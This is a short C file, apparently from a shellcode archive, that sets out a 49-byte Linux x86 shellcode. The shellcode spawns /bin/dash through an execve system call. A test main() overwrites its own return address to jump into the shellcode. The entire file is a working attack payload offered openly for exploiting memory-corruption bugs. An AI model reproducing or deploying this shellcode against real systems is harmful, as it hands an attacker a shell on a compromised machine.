/*
*  Shellcode length: 49
*  Author: Chroniccommand
*  /bin/dash
*  My first attempt at shellcode
*  Poison security
*/
#include<stdio.h>
//49 bytes
char shellcode[] =  "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a"
                    "\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d"
                    "\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f"
                    "\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42"
                    "\x42\x42\x43\x43\x43\x43";
int main(){
 printf("Shellcode length: 49 bytes\nAuthor:chroniccommand\nPoison security");
 int *ret;
 ret = (int *)&ret + 2;
 (*ret) = (int)shellcode;
}